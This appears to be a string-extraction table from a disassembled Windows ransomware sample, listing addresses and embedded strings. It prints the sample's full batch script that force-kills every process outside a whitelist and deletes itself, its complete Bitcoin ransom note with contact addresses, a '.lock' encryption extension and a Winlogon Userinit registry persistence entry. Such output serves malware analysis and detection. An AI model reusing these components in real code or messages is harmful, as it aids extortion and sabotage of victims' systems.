reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40101b	0x40d0a5	string	0x401000	ComSpec
0x401076	0x40d123	string	0x401000	SetLocal EnableDelayedExpansion EnableExtensions\r\nSet WinTitle=%Random%%Random%\r\nTitle %WinTitle%\r\nFor /F "tokens=2 skip=2 delims=," %%P In ('tasklist /FI "WINDOWTITLE eq %WinTitle%" /FO CSV') Do (Set MyPID=%%~P)\r\nTitle %~n0\r\nSet WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe:find.exe:conhost.exe:explorer.exe:ctfmon.exe:dllhost.exe:lsass.exe:services.exe:smss.exe:tasklist.exe:winlogon.exe:wmiprvse.exe:msdts.exe:bfsvc.exe:AdapterTroubleshooter.exe:alg.exe:dwm.exe:issch.exe:rundll32.exe:spoolsv.exe:wininit.exe:wmiprvse.exe:wudfhost.exe:taskmgr.exe:rdpclip.exe:logonui.exe:lsm.exe:spoolsv.exe:dwm.exe:dfssvc.exe:csrss.exe:svchost.exe:\r\nFor /F "tokens=1 skip=5 delims=," %%p In ('tasklist /FO CSV') Do (Echo :!ProcList!|Find /I ":%%~p:">nul||Set ProcList=%%~p:!ProcList!)\r\n:Compare\r\nFor /F "tokens=1,* delims=:" %%C In ("!ProcList!") Do (\r\nIf Not "%%C"=="" (\r\nEcho :!WhiteList!|Find /I ":%%C:">nul||Call :Kill "%%C"\r\nSet ProcList=%%D\r\nGoTo Compare\r\n)\r\n)\r\nTASKKILL /F /IM "sqlbrowser.exe"\r\ndel W.bat\r\nExit\r\n
0x401087	0x40d123	string	0x401000	SetLocal EnableDelayedExpansion EnableExtensions\r\nSet WinTitle=%Random%%Random%\r\nTitle %WinTitle%\r\nFor /F "tokens=2 skip=2 delims=," %%P In ('tasklist /FI "WINDOWTITLE eq %WinTitle%" /FO CSV') Do (Set MyPID=%%~P)\r\nTitle %~n0\r\nSet WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe:find.exe:conhost.exe:explorer.exe:ctfmon.exe:dllhost.exe:lsass.exe:services.exe:smss.exe:tasklist.exe:winlogon.exe:wmiprvse.exe:msdts.exe:bfsvc.exe:AdapterTroubleshooter.exe:alg.exe:dwm.exe:issch.exe:rundll32.exe:spoolsv.exe:wininit.exe:wmiprvse.exe:wudfhost.exe:taskmgr.exe:rdpclip.exe:logonui.exe:lsm.exe:spoolsv.exe:dwm.exe:dfssvc.exe:csrss.exe:svchost.exe:\r\nFor /F "tokens=1 skip=5 delims=," %%p In ('tasklist /FO CSV') Do (Echo :!ProcList!|Find /I ":%%~p:">nul||Set ProcList=%%~p:!ProcList!)\r\n:Compare\r\nFor /F "tokens=1,* delims=:" %%C In ("!ProcList!") Do (\r\nIf Not "%%C"=="" (\r\nEcho :!WhiteList!|Find /I ":%%C:">nul||Call :Kill "%%C"\r\nSet ProcList=%%D\r\nGoTo Compare\r\n)\r\n)\r\nTASKKILL /F /IM "sqlbrowser.exe"\r\ndel W.bat\r\nExit\r\n
0x4010fc	0x40d07d	string	0x4010b8	ReadMe.TxT
0x401132	0x40caa6	string	0x4010b8	All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: jajanielse@aol.com or jajanielse@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: jajanielse@aol.com or jajanielse@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID
0x401143	0x40caa6	string	0x4010b8	All your files have beenencrypted!\r\nAll your files have been encrypted due to a security problemwith your PC. If you want to restore them, write us to the e-mail support: jajanielse@aol.com or jajanielse@bitmessage.ch\r\nWrite this ID in the title of your message\r\nIn case of no answer in 24 hours write us to theese e-mails support: jajanielse@aol.com or jajanielse@bitmessage.ch\r\nYou have to pay for decryption in Bitcoins. The price dependson how fast you write to us. After payment we will send you thedecryption tool that will decrypt all your files.\r\nFree decryption as guarantee\r\nBefore paying you can send us up to 3 files for freedecryption. The total size of files must be less than 10Mb (nonarchived), and files should not contain valuable information.\r\n(databases,backups, large excel sheets, etc.)\r\nHow to obtain Bitcoins\r\nThe easiest way to buy bitcoins is LocalBitcoins site. Youhave to register, click 'Buy bitcoins', and select the seller bypayment method and price.\r\nhttps://localbitcoins.com/buy_bitcoins\r\nAlso you can find other places to buy Bitcoins and beginnersguide here:\r\nhttp://www.coindesk.com/information/how-can-i-buy-bitcoins/\r\nAttention!\r\nDo not rename encrypted files.\r\nDo not try to decrypt your data using third party software,it may cause permanent data loss.\r\nDecryption of your files with the help of third parties maycause increased price (they add their fee to our) or you can becomea victim of a scam.\r\n\r\n{{IDENTIFIER}}\r\nYour ID
0x40144d	0x40d095	string	0x4013df	windows
0x40150b	0x40d07d	string	0x4013df	ReadMe.TxT
0x4016ff	0x40ca97	string	0x40160d	.lock
0x401754	0x401760	string	0x401718	YXI}ÍE blocks=Basic Latin,Latin-1 Supplement
0x401756	0x40c8b1	string	0x401718	\r\nthread realtime error
0x401787	0x40c8b1	string	0x401718	\r\nthread realtime error
0x40190f	0x40c8e0	string	0x4018d1	\r\nsocket error
0x401931	0x40c910	string	0x4018d1	\r\nconnect error
0x4019a4	0x40c8ef	string	0x4018d1	\r\ndownload error
0x4019ff	0x40c900	string	0x4018d1	\r\nchksumm error
0x401a18	0x40c89f	string	0x4018d1	\r\ndownload key ok
0x401b57	0x40d5f5	string	0x401b51	c:\Windows\bfsvcm.exe
0x401b6c	0x40d525	string	0x401b51	SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
0x401b7b	0x40d60b	string	0x401b51	C:\Windows\system32\userinit.exe,
0x401b86	0x40d60b	string	0x401b51	C:\Windows\system32\userinit.exe,
0x401b8f	0x40d5eb	string	0x401b51	Userinit
0x401bbf	0x40d0a5	string	0x401b51	ComSpec
0x401bc9	0x40d0ad	string	0x401b51	/c del "
